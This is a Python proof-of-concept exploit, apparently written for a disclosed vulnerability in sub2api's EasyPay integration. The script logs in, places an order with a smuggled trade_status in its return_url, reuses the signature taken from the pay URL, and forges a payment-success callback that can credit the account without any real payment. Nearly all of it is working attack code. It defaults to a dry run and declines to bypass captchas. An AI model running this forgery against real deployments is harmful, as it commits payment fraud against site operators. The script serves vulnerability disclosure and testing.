#!/usr/bin/env python3
"""
PoC for Wei-Shaw/sub2api issue #7881
易支付回调签名复用 / return_url 参数走私 -> 无需商户密钥给自己账户入账

Affected: backend/internal/payment/provider/easypay.go (easyPaySign / VerifyNotification)
          backend/internal/service/payment_resume_service.go (CanonicalizeReturnURL)

Mechanism
---------
easyPaySign builds the signed string as  k1=v1&k2=v2...  with NO percent-encoding of
values, then appends pkey and MD5s it. VerifyNotification re-builds the exact same
string from whatever keys the callback carries. Because values are not escaped, a
value can smuggle "&k=v" and the two decompositions of one byte string are both
accepted.

return_url survives CanonicalizeReturnURL with its query intact, and
buildPaymentReturnURL re-encodes that query in sorted order, so an injected
`trade_status` lands LAST inside the return_url value -- immediately before the
`&type=` that the sort order always puts next. The attacker truncates return_url
one pair earlier and re-supplies trade_status as a real top-level parameter.
Identical base string, signature copied verbatim from their own pay URL.

Login
-----
Auth is  POST /api/v1/auth/login  {email, password}   <- EMAIL, not a username.
If the deployment enables Turnstile / Tencent captcha, the script will NOT try to
solve it: it tells you to fall back to --cookie. Use a throwaway test account.

Usage
-----
  # password from env (keeps it out of shell history / ps)
  export SUB2API_PASSWORD='...'
  python3 easypay_smuggle_poc.py --base https://site.example.com --email you@example.com

  # dry run (default): create the poisoned order, print the forgery, send nothing
  # add --send to actually fire the forged callback
  # 2FA: you'll be prompted for the 6-digit code
  # captcha: fall back to --cookie 'access_token=...'
"""

import argparse
import getpass
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

MARK = "=" * 78


# ---------------------------------------------------------------- http helpers
def http(method, url, *, body=None, headers=None, timeout=20):
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"<transport error: {e}>"


GATEWAY_HINTS = {
    502: "上游应用挂了或 nginx 找不到后端容器",
    503: "上游服务不可用（后端容器没起来 / 过载 / 维护中）",
    504: "上游超时（后端卡住或负载过高）",
}


def diagnose_gateway(st, raw, what):
    """非 JSON 响应 = 请求没到达 sub2api 后端，是 nginx/网关层挡下的。"""
    if st == 0:
        die(f"{what}：连接失败 —— {raw}", "确认域名和协议对不对（https 还是 http）。")
    body = raw.lstrip()
    if body.startswith("<"):
        try:
            json.loads(raw)
        except Exception:  # noqa: BLE001
            die(f"{what}：HTTP {st}，返回的是 HTML 而不是 sub2api 的 JSON。",
                "请求没有到达后端，被 nginx / 网关层挡下了。",
                GATEWAY_HINTS.get(st, ""),
                "自检：curl -sI " + "你的站点根地址")


def jbody(obj):
    return json.dumps(obj).encode()


def jhdr(extra=None):
    h = {"Content-Type": "application/json", "Accept": "application/json",
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) sub2api-poc"}
    h.update(extra or {})
    return h


def parse_env(body):
    """sub2api envelope: {code, message, reason, metadata, data}."""
    try:
        return json.loads(body)
    except Exception:  # noqa: BLE001
        return {}


# ------------------------------------------------------------------- login
CAPTCHA_HINTS = ("captcha", "turnstile", "验证码", "人机")


def looks_like_captcha(env, raw):
    blob = " ".join(str(env.get(k, "")) for k in ("message", "reason")).lower()
    return any(h in blob for h in CAPTCHA_HINTS) or "captcha" in raw.lower()


def die(msg, *hints):
    print(f"\n[!] {msg}", file=sys.stderr)
    for h in hints:
        print(f"    {h}", file=sys.stderr)
    sys.exit(1)


def login(root, email, password):
    """Returns (access_token, cookie_header_or_None)."""
    st, raw = http("POST", f"{root}/api/v1/auth/login",
                   body=jbody({"email": email, "password": password}), headers=jhdr())
    diagnose_gateway(st, raw, "登录请求")
    env = parse_env(raw)

    if looks_like_captcha(env, raw):
        die("这个部署开了人机验证（Turnstile / 腾讯验证码），脚本不会去绕它。",
            "两条正路：",
            "  1) 浏览器里正常登录，然后：",
            "     python3 easypay_smuggle_poc.py --base %s --cookie 'access_token=...'" % root,
            "  2) 管理员后台把该站点的验证码关掉（仅测试环境）")

    if st == 429:
        die("登录被限流（sub2api 对 /auth/login 是 20 次/分钟/IP）",
            "等一分钟再试。")

    data = env.get("data") or {}

    if data.get("requires_2fa"):
        temp = data.get("temp_token", "")
        masked = data.get("user_email_masked") or email
        print(f"[*] 该账号开了两步验证 ({masked})")
        code = getpass.getpass("    请输入 6 位验证码（输入不回显）: ").strip()
        st2, raw2 = http("POST", f"{root}/api/v1/auth/login/2fa",
                         body=jbody({"temp_token": temp, "totp_code": code}), headers=jhdr())
        env2 = parse_env(raw2)
        tok = (env2.get("data") or {}).get("access_token")
        if not tok:
            die("两步验证失败：" + str(env2.get("message") or raw2)[:200],
                "验证码输错/过期，或账号未绑定 TOTP。")
        print(f"[*] 登录成功：{masked}")
        return tok, None

    tok = data.get("access_token")
    if not tok:
        reason = env.get("reason") or ""
        msg = env.get("message") or raw[:200]
        if reason == "INVALID_CREDENTIALS" or st == 401:
            die("登录失败：" + msg, "确认是【邮箱】而不是用户名，密码大小写注意。")
        if reason in ("INVALID_USER", "USER_NOT_ACTIVE"):
            die("登录失败：" + msg, "账号被停用或不存在。")
        die(f"登录失败（HTTP {st}）：{msg}",
            "reason=" + str(reason),
            "如果是 500，多半是站点配置问题，与 PoC 无关。")

    user = data.get("user") or {}
    print(f"[*] 登录成功：{user.get('email', email)}")
    return tok, None


def resolve_auth(args, root):
    """Returns an Authorization/Cookie header dict."""
    if args.token:
        return {"Authorization": "Bearer " + args.token}
    if args.cookie:
        return {"Cookie": args.cookie}

    email = args.email or os.environ.get("SUB2API_EMAIL")
    password = args.password or os.environ.get("SUB2API_PASSWORD")
    if not email:
        die("需要 --token / --cookie，或 --email + 密码",
            "登录用的是邮箱（auth_handler.go:78 binding:\"required,email\"）。")

    if not password:
        password = getpass.getpass(f"    {email} 的密码（不回显）: ")
    tok, _ = login(root, email, password)
    return {"Authorization": "Bearer " + tok}


# ------------------------------------------------------------------- the PoC
def base_string(pairs):
    """Mirror of easyPaySign: sort keys, skip sign/sign_type/empty, no escaping."""
    d = {}
    for k, v in pairs:
        if k in ("sign", "sign_type") or v == "":
            continue
        d[k] = v
    return "&".join(f"{k}={d[k]}" for k in sorted(d))


def main():
    ap = argparse.ArgumentParser(
        description="sub2api #7881 EasyPay signature-reuse PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", required=True, help="site root, e.g. https://site.example.com")
    ap.add_argument("--email", help="login email (or $SUB2API_EMAIL)")
    ap.add_argument("--password", help="login password (prefer $SUB2API_PASSWORD, it stays out of shell history)")
    ap.add_argument("--token", help="skip login, use this JWT")
    ap.add_argument("--cookie", help="skip login, use this raw Cookie header (captcha fallback)")
    ap.add_argument("--payment-type", default="alipay")
    ap.add_argument("--amount", default="650.00")
    ap.add_argument("--send", action="store_true", help="actually fire the forged callback")
    args = ap.parse_args()

    root = args.base.rstrip("/")
    host = urllib.parse.urlparse(root).netloc
    path = "/payment/result"

    print(MARK)
    print("sub2api #7881  EasyPay signature-reuse PoC")
    print(MARK)

    auth = resolve_auth(args, root)
    auth.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) sub2api-poc")

    # ---- 1. attacker creates their own order with a poisoned return_url ------
    poisoned = f"https://{host}{path}?trade_status=TRADE_SUCCESS"
    payload = {
        "amount": float(args.amount),
        "payment_type": args.payment_type,
        "return_url": poisoned,
        "is_mobile": False,
    }
    print(f"\n[1] POST /api/v1/payment/orders  return_url={poisoned}")
    st, txt = http("POST", f"{root}/api/v1/payment/orders",
                   body=jbody(payload), headers=jhdr(auth))
    print(f"    HTTP {st}")
    diagnose_gateway(st, txt, "下单请求")
    env = parse_env(txt)
    if st == 401:
        die("令牌无效/过期：" + str(env.get("message") or "")[:200],
            "access_token 有有效期；改用 --email 重新登录。")
    data = env.get("data") or {}
    pay_url, out_trade_no = data.get("pay_url", ""), data.get("out_trade_no", "")
    if not pay_url:
        reason = str(env.get("reason") or "")
        hints = []
        if st == 400 and reason == "INVALID_RETURN_URL":
            hints = ["--base 的 host 必须和站点实际使用的域名一致",
                     "CanonicalizeReturnURL 要求 return_url 与请求 Host 同源"]
        die(f"下单失败（HTTP {st}）：{str(env.get('message') or txt)[:300]}",
            hints or ["常见原因：金额超限额 / 该 payment_type 没有可用易支付实例 / 账号等级不足"],
            ("reason=" + reason) if reason else "")
    print(f"    out_trade_no = {out_trade_no}")
    print(f"    pay_url      = {pay_url[:150]}...")
    if "submit.php" not in pay_url:
        die("pay_url 不是 submit.php -> 该实例不是 popup 模式。",
            "popup 才会把下单签名暴露给付款人，本 PoC 对 mapi/扫码模式不适用。")

    q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(pay_url).query, keep_blank_values=True))
    sign, signed_return = q.get("sign", ""), q.get("return_url", "")
    if not sign:
        die("pay_url 里没有 sign")

    # ---- 2. build the forgery ------------------------------------------------
    print(f"\n[2] 从自己的 pay_url 里摘到的签名（全程没用 pkey）")
    print(f"    sign        = {sign}")
    print(f"    return_url  = {signed_return}")
    suffix = "&trade_status=TRADE_SUCCESS"
    if not signed_return.endswith(suffix):
        die("return_url 末尾不是 &trade_status=TRADE_SUCCESS，走私形状对不上。",
            "该部署可能已经打过补丁，或 return_url 被净化了。实际值：", signed_return)
    prefix = signed_return[: -len(suffix)]

    cb = {k: v for k, v in q.items() if k not in ("sign", "sign_type")}
    cb["return_url"] = prefix
    cb_signed = dict(cb, trade_status="TRADE_SUCCESS")

    print("\n[3] 碰撞，逐字节对比")
    print("    下单   基础串: " + base_string(q.items()))
    print("    回调   基础串: " + base_string(cb_signed.items()))
    same = base_string(q.items()) == base_string(cb_signed.items())
    print(f"\n    完全相同: {same}   （两条后面拼的都是同一个 pkey）")
    if not same:
        die("没有碰撞，说明这个版本已经修了。")

    forged = (urllib.parse.urlencode(cb_signed)
              + f"&sign={urllib.parse.quote(sign)}&sign_type=MD5")
    print("\n[4] 伪造的回调：")
    print(f"    /api/v1/payment/webhook/easypay?{forged}")

    # ---- 3. fire -------------------------------------------------------------
    if not args.send:
        print("\n    DRY RUN —— 什么都没发。确认无误后加 --send。")
        return
    st, txt = http("GET", f"{root}/api/v1/payment/webhook/easypay?{forged}",
                   headers={"User-Agent": "EasyPay-SDK"})
    print(f"\n[5] webhook HTTP {st}: {txt.strip()[:200]}")

    st, txt = http("POST", f"{root}/api/v1/payment/public/orders/verify",
                   body=jbody({"out_trade_no": out_trade_no}), headers=jhdr())
    print(f"\n[6] 订单状态 HTTP {st}: {txt.strip()[:600]}")
    print("\n    如果易支付平台上查无此单、这边却已入账，漏洞即在你的部署上确认。")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\ninterrupted")